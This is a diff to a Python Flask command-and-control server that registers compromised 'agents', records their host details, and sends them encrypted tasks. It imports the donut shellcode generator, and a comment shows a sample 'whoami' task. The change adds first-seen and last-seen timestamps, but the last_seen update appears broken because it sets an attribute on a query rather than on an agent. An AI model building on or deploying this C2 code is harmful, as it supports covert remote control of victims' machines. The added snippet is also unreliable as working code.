@@ -6,6 +6,7 @@ from c2_config import *
 from c2_database import *
 from aesgcm import *
 import donut
+from datetime import datetime
 
 
 @login_manager.user_loader
@@ -45,7 +46,7 @@ def register_agent(): # --> this is a handler
             login_user(agent)
             print(f"[+] agent {agent.agent_id} has been authenticated")
         else:
-            agent = Agent(agent_id=reg_agent_id, username=reg_username, computer_name=reg_whoami, cpus=reg_cpus, osVersion=reg_osVersion, adaptors=reg_adaptors)
+            agent = Agent(agent_id=reg_agent_id, username=reg_username, computer_name=reg_whoami, cpus=reg_cpus, osVersion=reg_osVersion, adaptors=reg_adaptors, first_seen=datetime.now())
             db.session.add(agent)
             db.session.commit() ## saves the data to the database
             agent.authenticated = True
@@ -107,6 +108,10 @@ def get_task():
     # task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": "ok", "job_id"} 
     # ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###
 
+
+    agent = Agent.query.filter_by(agent_id=agent_id)
+    agent.last_seen = datetime.now()
+    db.session.commit()
     if task == None:
         return encrypt_data({"status": "no task"})
     else:
